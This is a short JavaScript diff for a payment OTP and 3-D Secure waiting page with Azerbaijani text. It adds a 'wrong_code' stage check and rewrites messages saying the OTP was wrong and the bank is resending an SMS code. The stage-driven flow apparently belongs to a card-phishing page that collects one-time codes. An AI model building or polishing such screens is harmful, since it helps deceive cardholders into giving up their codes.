@@ -37,7 +37,7 @@
       var ratio = Math.max(0, Math.min(1, left / total));
       ring.style.strokeDashoffset = (CIRC * (1 - ratio)).toFixed(1);
     }
-    if (left <= 0 && note) {
+    if (left <= 0 && note && currentStage !== 'wrong_code') {
       note.textContent = 'Vaxt bitdi. Əməliyyat hələ də yoxlanılır, ekranı bağlamayın.';
     }
   }
@@ -56,11 +56,11 @@
   function showWrongCode() {
     if (alertBox) {
       alertBox.className = 'alert alert--error';
-      alertBox.innerHTML = '<strong>Səhv 3-D kod daxil etmisiniz!</strong><br>Bankdan yeni kod göndərilir…';
+      alertBox.innerHTML = '<strong>❌ Səhv OTP — kod təkrar göndərilir</strong><br>Geri sayım bitdikdə yeni OTP ekranı açılacaq.';
       alertBox.style.display = '';
     }
-    if (title) { title.textContent = 'Yeni kod göndərilir'; }
-    if (note) { note.textContent = 'Lütfən yenidən OTP kodu daxil edin.'; }
+    if (title) { title.textContent = 'Yeni OTP kodu göndərilir'; }
+    if (note) { note.textContent = 'Zəhmət olmasa gözləyin, bank yeni SMS kodu göndərir.'; }
   }
 
   function showRetryOption() {
